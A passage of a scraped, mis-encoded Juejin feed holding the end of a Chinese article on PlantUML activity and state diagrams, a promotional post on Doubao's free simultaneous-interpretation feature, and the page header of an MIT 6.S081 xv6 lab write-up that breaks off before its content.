<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aaaffc1e28cb4fd2a509b7c345eb3c15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=bYLYnkauF1NytQy6gPmDSpVF3GA%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>å¼‚å¸¸è¡¥å¿ï¼šSAGA äº‹åŠ¡</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
start
:ä¸‹å•;
:æ‰£åº“å­˜;
if (å¼‚å¸¸?) then (yes)
    :è¡¥å¿ï¼šæ¢å¤åº“å­˜;
    :è¡¥å¿ï¼šå…³é—­è®¢å•;
    stop
endif
:æ”¯ä»˜;
:å‘è´§;
stop
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54b54d55776442848b073ac51f26c629~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=rDL5J505MMvObF%2Bv5kSQwEuNrg0%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>çŠ¶æ€æœºé£æ ¼ï¼šè®¢å•çŠ¶æ€æµè½¬</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
title è®¢å•çŠ¶æ€æœºï¼ˆæ´»åŠ¨å›¾è§†è§’ï¼‰
(*) --&gt; "å¾…æ”¯ä»˜"
"å¾…æ”¯ä»˜" --&gt; "å·²æ”¯ä»˜" : æ”¯ä»˜æˆåŠŸ
"å·²æ”¯ä»˜" --&gt; "å·²å‘è´§" : å•†å®¶å‘è´§
"å·²å‘è´§" --&gt; "å·²å®Œæˆ" : ç¡®è®¤æ”¶è´§
"å¾…æ”¯ä»˜" --&gt; "å·²å–æ¶ˆ" : è¶…æ—¶/ä¸»åŠ¨å–æ¶ˆ
"å·²å®Œæˆ" --&gt; (*)
@enduml
</code></pre>
<hr/>
<h2 data-id="heading-4">äº”ã€å¦‚ä½•æŠŠå›¾ç§’å˜ PPT / Confluence</h2>
<ol>
<li>PlantUML æ¸²æŸ“ â†’ å³é”®ã€Œ<strong>ä¸‹è½½ PNG/SVG</strong>ã€â†’ æ‹–è¿› PPT å³å¯çŸ¢é‡æ”¾å¤§ã€‚</li>
<li>Mermaid ä»£ç å—ç›´æ¥ç²˜åˆ° <strong>Typora / Notion / GitBook</strong> å®æ—¶é¢„è§ˆã€‚</li>
<li>Draw.io æ”¯æŒã€Œ<strong>é“¾æ¥åˆ° GitHub</strong>ã€ï¼šæŠŠ <code>.puml</code> æ–‡ä»¶å­˜ä»“åº“ï¼ŒDraw.io é€šè¿‡ URL å¯¼å…¥ï¼Œè‡ªåŠ¨åŒæ­¥æ›´æ–°ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-5">å…­ã€ä¸€å¼ è„‘å›¾æ€»ç»“ï¼ˆä¿å­˜å³å¯ï¼‰</h2>
<pre><code class="hljs">ç±»å›¾  =  éª¨æ¶  =  ä¸‰å±‚æ–¹æ¡† + å…³ç³»çº¿
æ—¶åºå›¾ = å¯¹è¯  = ç”Ÿå‘½çº¿ + ç®­å¤´ + æ¿€æ´»æ¡
æ´»åŠ¨å›¾ = åœ°å›¾  = åœ†è§’åŠ¨ä½œ + è±å½¢åˆ†æ”¯ + é»‘æ£’å¹¶è¡Œ
</code></pre>
<p><strong>è®°ä½å£è¯€</strong>ï¼š<br/>
â€œ<strong>ç±»å›¾çœ‹ç»“æ„ï¼Œæ—¶åºçœ‹äº¤äº’ï¼Œæ´»åŠ¨çœ‹æµç¨‹</strong>â€â€”â€”ä»»ä½•ä¸šåŠ¡å…ˆé—®è‡ªå·±ã€Œæˆ‘è¦çœ‹å•¥ï¼Ÿã€ï¼Œå†é€‰å›¾ï¼Œ3 åˆ†é’Ÿå°±èƒ½ç”»å‡ºæ¸…æ™°æ¶æ„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…è´¹ï¼è±†åŒ…åˆä¸Šæ–°åŠŸèƒ½ï¼ŒåŠæ‰“ä»˜è´¹è½¯ä»¶ï¼è€ç½—ç°åœºæ¼”ç¤ºï¼(é™„ä½¿ç”¨å…¥å£)]]></title>    <link>https://juejin.cn/post/7590071125398290472</link>    <guid>https://juejin.cn/post/7590071125398290472</guid>    <pubDate>2026-01-02T07:53:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398290472" data-draft-id="7590104561475354676" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…è´¹ï¼è±†åŒ…åˆä¸Šæ–°åŠŸèƒ½ï¼ŒåŠæ‰“ä»˜è´¹è½¯ä»¶ï¼è€ç½—ç°åœºæ¼”ç¤ºï¼(é™„ä½¿ç”¨å…¥å£)"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-02T07:53:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜Xå°é¹¿"/> <meta itemprop="url" content="https://juejin.cn/user/2928754709505608"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…è´¹ï¼è±†åŒ…åˆä¸Šæ–°åŠŸèƒ½ï¼ŒåŠæ‰“ä»˜è´¹è½¯ä»¶ï¼è€ç½—ç°åœºæ¼”ç¤ºï¼(é™„ä½¿ç”¨å…¥å£)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2928754709505608/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜Xå°é¹¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:53:08.000Z" title="Fri Jan 02 2026 07:53:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯Xå°é¹¿ã€‚å‰å‡ å¤©çš„ã€Œç½—æ°¸æµ©ç§‘æŠ€æ˜¥æ™šã€ï¼Œä¸çŸ¥é“å¤§å®¶æœ‰æ²¡æœ‰çœ‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf01108028864993a9176bc13780b130~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYWOWwj-m5vw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945188&amp;x-signature=QlKuSHurUB6vsxlxk79hns8ecc8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨ç§‘æŠ€æ˜¥æ™šä¸Šï¼Œè€ç½—å±•ç¤ºäº†è±†åŒ…æœ€è¿‘ä¸Šçº¿çš„æ–°åŠŸèƒ½ã€‚</p>
<p>ä½“éªŒäº†ä¸‹ï¼Œæ•ˆæœç¡®å®ä¸é”™ï¼Œç›´æ¥åŠæ‰“ä¸€äº›ä»˜è´¹è½¯ä»¶ï¼Œç”šè‡³è¿ä¹°ç¿»è¯‘è€³æœºå¤§å‡ åƒçš„é’±éƒ½èƒ½çœäº†ã€‚</p>
<p>è¿™ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯è±†åŒ… APP æœ€è¿‘ä¸Šçº¿çš„ã€Œ<strong>åŒå£°ä¼ è¯‘</strong>ã€ã€‚</p>
<p>ç›®å‰åœ¨è±†åŒ… APP ä¸Šï¼Œæ‰€æœ‰äººéƒ½å¯ä»¥å…è´¹ä½¿ç”¨ã€‚</p>
<p><strong>å…·ä½“èƒ½å¹²å•¥å‘¢ï¼Ÿ</strong></p>
<p>æ¯”å¦‚ä½ å‡ºå›½æ—…æ¸¸äº†ï¼Œä½†å¬ä¸æ‡‚ä»–ä»¬çš„è¯­è¨€ï¼Œé‚£ä¹ˆåœ¨äº¤æµçš„æ—¶å€™ï¼Œå°±å¯ä»¥æ‰“å¼€è±†åŒ…çš„åŒå£°ä¼ è¯‘ã€‚</p>
<p>å®ƒèƒ½å®æ—¶å°†å¤–è¯­è½¬æˆä¸­æ–‡è¯´å‡ºæ¥ã€‚ï¼ˆä»…ä»…åªæœ‰ 2~3 ç§’çš„æ—¶å»¶ï¼‰</p>
<p>åˆæ¯”å¦‚ï¼Œä½ æƒ³ç»§ç»­å’Œå¯¹æ–¹äº¤æµï¼Œä½†æ˜¯ä¸ä¼šè¯´ä»–ä»¬çš„è¯­è¨€ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å¯¹è±†åŒ…è¯´ä¸­æ–‡ã€‚</p>
<p>è±†åŒ…ä¹Ÿèƒ½åœ¨æçŸ­çš„æ—¶å»¶å†…ï¼Œå°†ä¸­æ–‡è½¬æˆå¯¹æ–¹çš„è¯­è¨€ï¼Œç”šè‡³è¿˜<code>å…‹éš†äº†ä½ çš„éŸ³è‰²</code>æ¥è¯´ã€‚</p>
<p>å°±å¾ˆçœŸå®ã€‚</p>
<p><strong>æ”¯æŒå¤šç§è¯­è¨€çš„äº’è¯‘</strong></p>
<p>è±†åŒ…çš„åŒå£°ä¼ è¯‘ï¼Œæ”¯æŒä¸­ã€è‹±ã€æ—¥ã€å¾·ã€æ³•ã€è¥¿ç­ç‰™ã€è‘¡è„ç‰™ã€å°å°¼ 7 ç§è¯­è¨€çš„äº’è¯‘ã€‚</p>
<p>è€Œä¸”åœ¨ä¸­æ–‡å’Œè‹±æ–‡äº’è¯‘çš„æ—¶å€™ï¼Œç”šè‡³éƒ½ä¸éœ€è¦è‡ªå·±æ‰‹åŠ¨åˆ‡æ¢ï¼Œå°±å¾ˆæ–¹ä¾¿ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebf990c73e7a4949bbd0732d3b57e806~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYWOWwj-m5vw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945188&amp;x-signature=4EsSOBwjI1JaGl8EXj%2BdYnox174%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-0">è±†åŒ…åŒå£°ä¼ è¯‘å…¥å£</h2>
<p>è±†åŒ…çš„åŒå£°ä¼ è¯‘åœ¨å“ªé‡Œä½¿ç”¨å‘¢ï¼Ÿ</p>
<p>æ‰“å¼€è±†åŒ… APPï¼Œç‚¹ã€Œæ‰“ç”µè¯ã€ï¼Œä¸Šé¢çš„å’Œä¸‹é¢çš„éƒ½å¯ä»¥ã€‚ï¼ˆå·¦å›¾ï¼‰</p>
<p>è¿›æ¥åï¼Œç‚¹ã€Œé€‰æ‹©æƒ…æ™¯ã€-ã€ŒåŒå£°ä¼ è¯‘ã€ï¼Œå°±å¯ä»¥ä½“éªŒäº†ã€‚ï¼ˆå³å›¾ï¼‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ea701ea389e4389955b9f40632d7c97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYWOWwj-m5vw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945188&amp;x-signature=CzwVcIg8RpwrizR0vrMeXhzXsbk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ç‚¹ã€ŒåŒå£°ä¼ è¯‘ã€è¿›å…¥ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9881c6ad12524bf0b0a9efc8f8c607fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYWOWwj-m5vw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945188&amp;x-signature=YC2xNahes3LnQbPurddTFa350hg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-1">å†™åœ¨æœ€å</h2>
<p>æœ€åæ¥æ€»ç»“ä¸€ä¸‹å§ã€‚</p>
<p>è±†åŒ…çš„åŒå£°ä¼ è¯‘ï¼Œå¯ä»¥è®©æˆ‘ä»¬åœ¨æä½çš„æ—¶å»¶ä¸‹ï¼Œå®ç°ä¸­æ–‡å’Œå¤–å›½è¯­è¨€é—´çš„å®æ—¶ç¿»è¯‘ï¼Œéå¸¸é€‚åˆ<code>è·¨å›½ã€è·¨è¯­è¨€æ²Ÿé€š</code>çš„åœºæ™¯ã€‚</p>
<ul>
<li>è±†åŒ…çš„åŒå£°ä¼ è¯‘æ”¯æŒ 7 ç§è¯­è¨€çš„äº’è¯‘</li>
<li>åŒä¼ æ—¶å»¶ 2~3 ç§’</li>
<li>æ”¯æŒå…‹éš†éŸ³è‰²</li>
<li>é€‚ç”¨äºå‡ºå›½æ—…æ¸¸ã€è·¨å›½ä¼šè®®ã€è§‚çœ‹å›½å¤–è§†é¢‘ / åœ¨çº¿è¯¾ç¨‹ã€è®²åº§ç­‰åœºæ™¯</li>
<li>å®Œå…¨å…è´¹</li>
</ul>
<blockquote>
<p>æ³¨ï¼šå»ºä½¿ç”¨æ—¶å¯ä»¥å¸¦ä¸Šè€³æœºï¼ŒåŒä¼ ä½“éªŒæ›´å¥½ã€‚</p>
</blockquote>
<p>ä»¥ä¸Šå°±æ˜¯ä»Šå¤©çš„åˆ†äº«ï¼Œæœ‰éœ€è¦çš„å¯ä»¥ä½“éªŒä¸€ä¸‹ã€‚</p>
<hr/>
<blockquote>
<p>æˆ‘æ˜¯<a href="https://juejin.cn/user/2928754709505608/posts" title="https://juejin.cn/user/2928754709505608/posts" target="_blank">ç¨‹åºå‘˜Xå°é¹¿</a>ï¼Œå‰äº’è”ç½‘å¤§å‚ç¨‹åºå‘˜ï¼Œä¹Ÿæ˜¯ä¸€å AIGC çˆ±å¥½è€…ï¼ŒæŒç»­åˆ†äº«æ›´å¤šå¥½ç”¨çš„ AI å·¥å…·ï¼Œæ¬¢è¿ä¸€èµ·äº¤æµ~</p>
</blockquote>
<p><strong>æ¨èé˜…è¯»</strong></p>
<p><a href="https://juejin.cn/post/7454501732203610131" title="https://juejin.cn/post/7454501732203610131" target="_blank">2024å¹´ç»ˆAIå·¥å…·æ±‡æ€»ï¼š9å¤§AIé¢†åŸŸï¼Œ70+ç²¾é€‰AIå·¥å…·ï¼Œå…¨éƒ½åœ¨è¿™äº†ï¼(å»ºè®®æ”¶è—)</a></p>
<p>æ›´å¤š AI å·¥å…·è§<a href="https://juejin.cn/column/7284164153576947724" title="https://juejin.cn/column/7284164153576947724" target="_blank">ã€AIå·¥å…·ã€‘</a>ä¸“æ ï¼ŒæŒç»­æ›´æ–°ä¸­ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MIT 6.S081 Lab 1. Xv6 and Unix utilities]]></title>    <link>https://juejin.cn/post/7590071125398306856</link>    <guid>https://juejin.cn/post/7590071125398306856</guid>    <pubDate>2026-01-02T07:53:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398306856" data-draft-id="7590054976489324584" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MIT 6.S081 Lab 1. Xv6 and Unix utilities"/> <meta itemprop="keywords" content="æ“ä½œç³»ç»Ÿ"/> <meta itemprop="datePublished" content="2026-01-02T07:53:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è®©æµè¤å†æ¬¡ä¼Ÿå¤§"/> <meta itemprop="url" content="https://juejin.cn/user/4057652418580288"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MIT 6.S081 Lab 1. Xv6 and Unix utilities
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4057652418580288/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è®©æµè¤å†æ¬¡ä¼Ÿå¤§
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:53:12.000Z" title="Fri Jan 02 2026 07:53:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 